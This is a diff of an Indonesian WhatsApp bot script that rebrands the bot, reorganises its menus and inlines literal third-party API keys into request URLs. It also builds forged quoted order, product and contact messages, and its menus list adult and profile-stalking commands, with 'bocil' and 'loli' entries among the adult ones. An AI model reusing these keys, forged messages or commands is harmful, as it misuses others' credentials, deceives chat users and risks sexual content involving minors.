@@ -1,13 +1,3 @@
-///----------( Created By P S Y C O  B O T )----------\\\
-
-/**
-* Note:
-* Kalau Mau Recode/Reupload Kasih Credit
-**/
-
-///--------------------------------------------------------------\\\
-
-
 const {
     WAConnection,
 	MessageType,
@@ -74,7 +64,7 @@ const level = require("./lib/level");
 const atm = require("./lib/atm");
 const _sewa = require("./lib/sewa");
 
-var kuis = true
+var kuis = false
 hit_today = []
 ky_ttt = []
 const setGelud = require('./lib/gameGelud.js')
@@ -92,15 +82,8 @@ let setting = JSON.parse(fs.readFileSync('./setting.json'))
 owner = setting.owner
 gamewaktu = setting.gamewaktu
 petik = '```'
-fake = 'CREATOR BOT INDONESIA'
+fake = 'CREATOR BOT\©PsycoBOTZ'//GANTI NAMA KAMU
 ban =[]
-lolkey = 'YTRAMLANID'
-zekskey = 'NinoWangy'
-psycokey = 'PsycoBot'
-xteamkey = 'kurrxd09'
-LeysKey = 'MIMINGANZ'
-
-// Udah No Enc Free Api Key Masih Aja Kagak Subrek
 
 // Database
 let register = JSON.parse(fs.readFileSync('./database/user/register.json'))
@@ -251,7 +234,7 @@ module.exports = dha = async (dha, mek) => {
         const isLevelingOn = isGroup ? _leveling.includes(from) : false
         const isMuted = isGroup ? mute.includes(from) : false
         const isAntiLink = isGroup ? antilink.includes(from) : false
-        const isWelkom = isGroup ? welkom.includes(from) : true
+        const isWelkom = isGroup ? welkom.includes(from) : false
         
         // here button function
         selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
@@ -292,7 +275,7 @@ module.exports = dha = async (dha, mek) => {
         const textImg = (teks) => {
            return dha.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync('./media/ganteng.jpg')})
         }
-        const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/canss.jpg')
+        const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/sherlynn.jpg')
         }}}
        const math = (teks) => {
            return Math.floor(teks)
@@ -330,7 +313,7 @@ module.exports = dha = async (dha, mek) => {
 	       for (let i of members){
 	       ane.push(i.jid)
 }
-	       dha.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/canss.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
+	       dha.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/sherlynn.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
 }  
       const sendWebp = async(to, url) => {
            var names = Date.now() / 10000;
@@ -354,70 +337,6 @@ module.exports = dha = async (dha, mek) => {
 });
 });
 }
-       
-       //button image
-const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
-try {
-mhan = await dha.prepareMessage(from, gam1, image, {thumbanil: gam1})
-const buttonMessages = {
-imageMessage: mhan.message.imageMessage,
-contentText: text1,
-footerText: desc1,
-buttons: but,
-headerType: 4
-}
-dha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
-} catch(e) {
-if (e.toString().includes('marker was')) {
-mhan = await dha.prepareMessage(from, gam1, image, {thumbanil: gam1})
-const buttonMessages = {
-imageMessage: mhan.message.imageMessage,
-contentText: text1,
-footerText: desc1,
-buttons: but,
-headerType: 4
-}
-dha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
-} else if (e.toString().includes('ENOENT')) {
-mhan = await dha.prepareMessage(from, gam1, image, {thumbanil: gam1})
-const buttonMessages = {
-imageMessage: mhan.message.imageMessage,
-contentText: text1,
-footerText: desc1,
-buttons: but,
-headerType: 4
-}
-dha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
-} else  {
-return e
-}
-}
-}
-    const sendButVideo = async (
-      id,
-      text1,
-      desc1,
-      vid1,
-      but = [],
-      options = {}
-    ) => {
-      kma = vid1;
-      mhan = await dha.prepareMessage(from, kma, video);
-      const buttonMessages = {
-        videoMessage: mhan.message.videoMessage,
-        contentText: text1,
-        footerText: desc1,
-        buttons: but,
-        headerType: 5,
-      };
-      dha.sendMessage(
-        id,
-        buttonMessages,
-        MessageType.buttonsMessage,
-        options
-      );
-    };
-       
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
            if(mids.length > 0){
            text = normalizeMention(to, text, mids)
@@ -611,9 +530,9 @@ return e
 		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
 		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
 		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
+        const troli =  {key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 300, status: 200, thumbnail: fakeimage, surface: 200, message: fake, orderTitle: 'dha', sellerJid: '0@s.whatsapp.net'} } }
         const ftext = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6285643260438@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*Hai ${pushname}👋*\n  ${moment().utcOffset('+0700').format('HH:mm:ss')} ${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./media/ganteng.jpg')}}}
-        
-        const ftoko = {key: {fromMe: false,participant: `6285643260438@s.whatsapp.net`, ...(from ? { remoteJid: "6285643260438@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./media/ganteng.jpg`)},"title": `HALLO...${pushname}`,"description": "${botName}", "currencyCode": "IDR","priceAmount1000": "999999","retailerId": "${botName}","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
+        const ftoko = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6285643260438@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./media/ganteng.jpg`)},"title": `HALLO...${pushname}JANGAN LUPA DI ORDER`,"description": "PsycoBOTZ", "currencyCode": "IDR","priceAmount1000": "999999","retailerId": "PSYCOBOTZ","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
 
       // Anti link
         if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
@@ -626,7 +545,7 @@ return e
         
 let {
     banChats,
-} = true
+} = setting
 
 function banChat() {
     if (banChats == true) {
@@ -635,11 +554,8 @@ function banChat() {
         return true
     }
 }
- if (!isGroup && !isCmd && !mek.key.fromMe) {
-      	simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
-                     sami = simi.success
-                        dha.sendMessage(from, `_${sami}_`, text, {thumbnail: fakeimage, sendEphemeral: true, quoted:mek, contextInfo : {forwardingScore: 508, isForwarded: true}})
-                      }
+        
+
                 // Sewa
              _sewa.expiredCheck(dha, sewa)
              
@@ -649,13 +565,13 @@ function banChat() {
  }
             
               const getWin = (userId) => {
-              let position = true
+              let position = false
               Object.keys(_win).forEach((i) => {
               if (_win[i].jid === userId) {
               position = i
        }
         })
-              if (position !== true) {
+              if (position !== false) {
               return _win[position].win
             }
         }
@@ -891,9 +807,7 @@ function banChat() {
                break 
         case 'owner':
         case 'creator':
-        case 'script':
-        case 'sourcecode':
-               sendKontak(from, `${owner}`, `${ownerName}`, 'Developer BOT WA')
+               sendKontak(from, `${owner}`, `${ownerName}`, 'Sibukk!!')
                await sleep(1000)
                txtt =`Hai Kak..... ${pushname}\nItu Ownerku, Mau tau soal apa ya?`
 
@@ -924,26 +838,27 @@ dha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 
         case 'menu':
         case 'help':
-        case 'allmenu':
-        menu =`Hai Kak.....\n*${pushname}*\n\`\`\`Saya PSYCO BOTZ, SENANG BISA BERTEMU DENGANMU HARI INI\`\`\`
+        menu =`Hai Kak.....\n*${pushname}*\n\`\`\`Saya PSYCOBOTZ,SENANG BISA BERTEMU DENGANMU HARI INI\`\`\`
         
 INFO PENGGUNA BOT
 ❏ NAMA : *${pushname}*
-❏ API : *https://wa.me/${sender.split('@')[0]}*
+❏ API : *@${sender.split('@')[0]}*
 ❏ STATUS : *${isOwner ? 'OWNER' : isPremium ? 'Premium' : 'Gratisan'}*
 ❏ LIMIT : *${isPremium ? 'Unlimited' : `${gcount}`}*
 
 INFO BOT
-❏ NAMA BOT : *${botName}*
-❏ OWNER : *${ownerName}*
+❏ NAMA : *PSYCOBOTZ*
+❏ API : @62856432604381
+❏ OWNER : *©NIZAM STORE*
+❏ API : *@62856432604381*
 ❏ AKTIF : *${runtime(process.uptime())}*
 ❏ BATERAI : *${baterai}%*
 ❏ PREIFIX : *『${prefix}』*
-`
+❏ RestApi : https://api-psycho.herokuapp.com
 
-menunya =`   ━━━━━ ALL MENU ━━━━━
+   ━━━━━ ALL MENU ━━━━━
 
-${petik}INFO MENU${petik}
+INFO MENU
 *=> ${prefix}update*
 *=> ${prefix}iklan*
 *=> ${prefix}level*
@@ -960,9 +875,9 @@ ${petik}INFO MENU${petik}
 *=> ${prefix}leaderboard*
 *=> ${prefix}cekpremium*
 *=> ${prefix}listpremium*
-*=> ${prefix}lapor* [ keluhan ]
+*=> ${prefix}bugreport* [ keluhan ]
 
-${petik}GRUP MENU${petik}
+GRUP MENU
 *=> ${prefix}groupsetting*
 *=> ${prefix}getbio* _reply_
 *=> ${prefix}afk* _alasan_
@@ -988,7 +903,7 @@ ${petik}GRUP MENU${petik}
 *=> ${prefix}linkgc*
 *=> ${prefix}getdeskgc*
 
-${petik}GAME MENU${petik}
+GAME MENU
 *=> ${prefix}limitgame*
 *=> ${prefix}slot*
 *=> ${prefix}gelud* _@tag_
@@ -1011,7 +926,7 @@ ${petik}GAME MENU${petik}
 *=> ${prefix}tebakbendera*
 *=> ${prefix}suit* _batu/kertas/gunting_
 
-${petik}ISLAM MENU${petik}
+ISLAM MENU
 *=> ${prefix}kisahnabi*
 *=> ${prefix}jadwalsholat*
 *=> ${prefix}alquran*
@@ -1019,7 +934,7 @@ ${petik}ISLAM MENU${petik}
 *=> ${prefix}alquranaudio*
 *=> ${prefix}listsurah*
 
-${petik}DOWNLOADER MENU${petik}
+DOWNLOADER MENU 
 *=> ${prefix}fbdl*
 *=> ${prefix}igdl*
 *=> ${prefix}igdl2*
@@ -1035,57 +950,24 @@ ${petik}DOWNLOADER MENU${petik}
 *=> ${prefix}mediafire*
 *=> ${prefix}nhentaipdf* _code_
 
-${petik}NULIS MENU${petik}
-*=> ${prefix}nuliskanan* _teks_
-*=> ${prefix}nuliskiri* _teks_
-*=> ${prefix}foliokanan* _teks_
-*=> ${prefix}foliokiri* _teks_
-
-${petik}SERTIFIKAT MENU${petik}
-*=> ${prefix}tololserti* _teks_
-*=> ${prefix}fuckboyserti* _teks_
-*=> ${prefix}fuckgirlserti* _teks_
-*=> ${prefix}bucinserti* _teks_
-*=> ${prefix}pacarserti* _teks|teks_
-
-${petik}MAKER MENU${petik}
+MAKER MENU
 *=> ${prefix}tahta* _teks_
 *=> ${prefix}cup* _teks_
 *=> ${prefix}cup1* _teks_
 *=> ${prefix}coffe* _teks_
+*=> ${prefix}sertitolol* _teks_
+*=> ${prefix}nulis* _teks_
 *=> ${prefix}multicolor3d* _teks_
 *=> ${prefix}watercolor* _teks_
 *=> ${prefix}luxurygold* _teks_
 *=> ${prefix}wetglass* _teks_
 *=> ${prefix}freefire* _teks_
 *=> ${prefix}pornhub* _teks_
+*=> ${prefix}wooden3d* _teks_
 *=> ${prefix}textbyname* _teks_
 *=> ${prefix}birthdayday* _teks_
-*=> ${prefix}galaxywallpaper* _teks_
-*=> ${prefix}lighttext* _teks_
-*=> ${prefix}beautifulflower* _teks_
-*=> ${prefix}puppycute* _teks_
-*=> ${prefix}royaltext* _teks_
-*=> ${prefix}heartshaped* _teks_
-*=> ${prefix}birthdaycake* _teks_
-*=> ${prefix}galaxystyle* _teks_
-*=> ${prefix}hologram3d* _teks_
-*=> ${prefix}greenneon* _teks_
-*=> ${prefix}glossychrome* _teks_
-*=> ${prefix}metallogo* _teks_
-*=> ${prefix}greenbush* _teks_
-*=> ${prefix}noeltext* _teks_
-*=> ${prefix}glittergold* _teks_
-*=> ${prefix}textcake* _teks_
-*=> ${prefix}starsnight* _teks_
-*=> ${prefix}wooden3d* _teks_
-*=> ${prefix}writegalacy* _teks_
-*=> ${prefix}galaxybat* _teks_
-*=> ${prefix}snow3d* _teks_
-*=> ${prefix}goldplaybutton* _teks_
-*=> ${prefix}silverplaybutton* _teks_
 
-${petik}STICKER MENU${petik}
+STICKER MENU
 *=> ${prefix}attp* _teks_
 *=> ${prefix}ttp* _teks_
 *=> ${prefix}dadu*
@@ -1099,41 +981,30 @@ ${petik}STICKER MENU${petik}
 *=> ${prefix}swm* _pack|author_
 *=> ${prefix}take* _pack|author_
 
-${petik}COVERT MENU${petik}
+COVERT MENU
 *=> ${prefix}toimg*
 *=> ${prefix}tovideo*
 *=> ${prefix}tomp3*
-*=> ${prefix}togif*
 
-${petik}ASUPAN MENU${petik}
+DEWASA MENU
 *=> ${prefix}xnxx* _link_
 *=> ${prefix}xnxxsearch*
 *=> ${prefix}asupan*
-*=> ${prefix}asupan1*
-*=> ${prefix}cecan*
 *=> ${prefix}santuy*
 *=> ${prefix}bocil*
 *=> ${prefix}ghea*
-*=> ${prefix}hijaber*
-*=> ${prefix}rikagusriani*
+*=> ${prefix}hijab*
+*=> ${prefix}rika*
 *=> ${prefix}ukty*
 
-${petik}CECAN MENU${petik}
-*=> ${prefix}indonesia*
-*=> ${prefix}malaysia*
-*=> ${prefix}korea*
-*=> ${prefix}thailand*
-*=> ${prefix}china*
-*=> ${prefix}jepang*
-
-${petik}STALK MENU${petik}
+STALK MENU
 *=> ${prefix}igstalk*
 *=> ${prefix}ffstalk*
 *=> ${prefix}iguser*
 *=> ${prefix}tiktokstalk*
 *=> ${prefix}githubstalk*
 
-${petik}TOOLS MENU${petik}
+TOOLS MENU
 *=> ${prefix}addvn*
 *=> ${prefix}listvn*
 *=> ${prefix}getvn*
@@ -1150,7 +1021,7 @@ ${petik}TOOLS MENU${petik}
 *=> ${prefix}listcmd*
 *=> ${prefix}delcmd*
 
-${petik}WIBU MENU${petik}
+WIBU MENU
 *=> ${prefix}loli*
 *=> ${prefix}manga*
 *=> ${prefix}anime*
@@ -1166,6 +1037,7 @@ ${petik}WIBU MENU${petik}
 *=> ${prefix}kusonime*
 *=> ${prefix}megumin*
 *=> ${prefix}otakudesu*
+*=> ${prefix}doujindesu*
 *=> ${prefix}storyanime*
 *=> ${prefix}otakuongoing*
 *=> ${prefix}nhentai* _code_
@@ -1173,34 +1045,14 @@ ${petik}WIBU MENU${petik}
 *=> ${prefix}nekopoi3d*
 *=> ${prefix}nekopoicosplay*
 *=> ${prefix}nekopoisearch*
-*=> ${prefix}chiisaihentai*
-*=> ${prefix}trap*
-*=> ${prefix}blowjob*
-*=> ${prefix}yaoi*
-*=> ${prefix}ecchi*
-*=> ${prefix}ahegao*
-*=> ${prefix}hololewd*
-*=> ${prefix}sideoppai*
-*=> ${prefix}animefeets*
-*=> ${prefix}animebooty*
-*=> ${prefix}animethighss*
-*=> ${prefix}hentaiparadise*
-*=> ${prefix}animearmpits*
-*=> ${prefix}hentaifemdom*
-*=> ${prefix}lewdanimegirls*
-*=> ${prefix}biganimetiddies*
-*=> ${prefix}animebellybutton*
-*=> ${prefix}hentai4everyone*
 
-${petik}QUOTES MENU${petik}
+KATA MENU
 *=> ${prefix}quotes*
 *=> ${prefix}quotesanime*
 *=> ${prefix}faktaunik* 
 *=> ${prefix}pantun* 
-*=> ${prefix}katabijak*
-*=> ${prefix}bucin*
 
-${petik}OWNER MENU${petik}
+OWNER MENU
 *=> ${prefix}bc* _teks_
 *=> ${prefix}tobc* _audio_
 *=> ${prefix}term*
@@ -1223,7 +1075,7 @@ ${petik}OWNER MENU${petik}
 *=> ${prefix}sharelock*
 *=> ${prefix}chat* _nomor|teks_
 
-${petik}OTHER MENU${petik}
+OTHER MENU
 *=> ${prefix}nekopoisearch* _query_
 *=> ${prefix}ytsearch* _query_
 *=> ${prefix}shopee* _product_
@@ -1232,9 +1084,9 @@ ${petik}OTHER MENU${petik}
 *=> ${prefix}google* _query_
 *=> ${prefix}image* _query_
 *=> ${prefix}pinterest* _query_
-*=> ${prefix}fetch* _query_
 *=> ${prefix}translate*
 *=> ${prefix}kbbi*
+*=> ${prefix}jadibot*
 *=> ${prefix}lolkey*
 *=> ${prefix}covidindo*
 *=> ${prefix}covidglobal*
@@ -1244,11 +1096,12 @@ ${petik}OTHER MENU${petik}
 *=> ${prefix}cuaca*
 *=> ${prefix}infogempa*
 *=> ${prefix}tourl*
-*=> ${prefix}ppcouple*
+*=> ${prefix}tinyurl*
 *=> ${prefix}bilangangka*
+*=> ${prefix}artimimpi*
 *=> ${prefix}resepmasakan*
 
-${petik}FUN MENU${petik}
+FUN MENU
 *=> ${prefix}mining*
 *=> ${prefix}cekwatak*
 *=> ${prefix}cekmati* _nama_
@@ -1262,7 +1115,7 @@ ${petik}FUN MENU${petik}
 *=> ${prefix}apakah*
 *=> ${prefix}bisakah*
 *=> ${prefix}kapankah*
-*=> ${prefix}nilai*
+*=> ${prefix}rate*
 *=> ${prefix}jadian*
 *=> ${prefix}cantik*
 *=> ${prefix}ganteng*
@@ -1270,26 +1123,45 @@ ${petik}FUN MENU${petik}
 *=> ${prefix}babi*
 *=> ${prefix}cekganteng*
 *=> ${prefix}cekcantik*
-\n© NIZAM STORE`
-               buttons = [{buttonId: `${prefix}donasi`,buttonText:{displayText: 'DONASI'},type:1},{buttonId: `${prefix}rules`,buttonText:{displayText: 'RULES'},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'OWNER'},type:1}]
+_NOTE: FITUR MASIH TAHAP PENGEMBANGAN_`
+               buttons = [{buttonId: `${prefix}command`,buttonText:{displayText: 'ALL MENU'},type:1},{buttonId: `${prefix}rules`,buttonText:{displayText: 'RULES'},type:1},{buttonId:`${prefix}store`,buttonText:{displayText:'SHOP GAME'},type:1}]
 
-               imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/canss.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/canss.jpg`)})).imageMessage
+               imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/sherlynn.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/sherlynn.jpg`)})).imageMessage
 
                buttonsMessage = {
                contentText: `${menu}`,
-               footerText: `${menunya}`, imageMessage: imageMsg,
+               footerText: '\`\`\`JIKA NEMU BUG/EROR SEGERA HUBUNGIN OWNER WA 62856432604381\`\`\`', imageMessage: imageMsg,
                buttons: buttons,
                headerType: 4
 }
 
-               prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftoko})
+               prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
               dha.relayWAMessage(prep)
                 break
-
+        case 'command':
+               list = []
+               listmenu = [`buttongc`,`buttonwibu`,`buttonstik`,`islammenu`,`ceritamenu`,`makermenu`,`dewasamenu`,`buttonown`,`buttongame`,`funmenu`,`buttondl`,`infomenu`,`othermenu`,`toolsmenu`]
+               listmenuu = [`Menu Group`,`Wibu Menu`,`Sticker Menu`,`Islam Menu`,`Cerita Menu`,`Maker Menu`,`Dewasa Menu`,`Owner Menu`,`Game Menu`,`Fun Menu`,`Downloader`,`Info Menu`,`MenuLainnya`,`Tools Menu`]
+               nombor = 1
+               startnum = 0
+               for (let x of listmenu) {
+               const yy = {title: 'silahkan pilih menunya ' + nombor++,
+                    rows: [
+                       {
+                        title: `${listmenuu[startnum++]}`,
+                        description: ``,
+                        rowId: `${prefix}${x}`
+                      }
+                    ]
+                   }
+                        list.push(yy)
+           }
+               listmsg(from, `${ucapanWaktu}`,  `Hai kak......\n*${pushname}*\nPilih Disini`, list)
+               break
        case 'store':
                list = []
                listmenu = [`ff`,`ml`,`pubg`,`masukandata`,`bayar`,`help`,`grupbot`,`grupdm`,`owner`]
-               listmenuu = [`LIST DM FF`,`LIST DM ML`,`LIST DM PUBG`,`MASUKAN DATA`,`BAYAR`,`BACK TO MENU`,`GRUP BOT`,`GRUP JB`,`OWNER`]
+               listmenuu = [`LIST DM FF`,`LIST DM ML`,`LIST DM PUBG`,`MASUKAN DATA`,`BAYAR`,`BACK TO MENU`,`GRUP BOT`,`GRUP DM`,`OWNER`]
                nombor = 1
                startnum = 0
                for (let x of listmenu) {
@@ -1377,7 +1249,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'family100':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
-              anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolkey}`)
+              anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=najisbaperanRw`)
               reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.aswer.length}\n\nWaktu : ${gamewaktu}s`)
               let anoh = anu.data.result.aswer
               let rgfds = []
@@ -1393,7 +1265,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'tebakanime':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakchara?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakchara?apikey=najisbaperanRw`)
               get_result = get_result.result
               ini_image = get_result.image
               jawaban = get_result.name
@@ -1415,7 +1287,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'tebaklagu':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebaklagu.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
-              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=${xteamkey}&id=4mFuArYRh3SO8jfffYLSER`)
+              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=kurrxd09&id=4mFuArYRh3SO8jfffYLSER`)
               get_result = get_result.result
               ini_audio = get_result.preview
               jawaban = get_result.judul
@@ -1438,7 +1310,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'tebaktebakan':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${xteamkey}`)
+              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=kurrxd09`)
               get_result = get_result.result
               jawaban = get_result.jawaban
               kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
@@ -1499,7 +1371,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'siapaaku':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.answer
               kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
@@ -1520,7 +1392,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'tebakkata':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebakata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/kata?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/kata?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.jawaban
               pertanyaan = get_result.pertanyaan
@@ -1540,7 +1412,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'tebaklirik':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/lirik?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/lirik?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.answer
               kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
@@ -1561,7 +1433,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
       case 'tebakjenaka':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/jenaka?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/jenaka?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.answer
               kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
@@ -1582,7 +1454,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'kimiakuis':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebakimia.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.lambang
               pertanyaan = get_result.nama
@@ -1602,7 +1474,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'tebakbendera':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.name
               kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
@@ -1623,7 +1495,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'susunkata':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (susunkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.jawaban
               pertanyaan = get_result.pertanyaan
@@ -1643,7 +1515,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'asahotak':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/asahotak?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/asahotak?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.jawaban
               kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
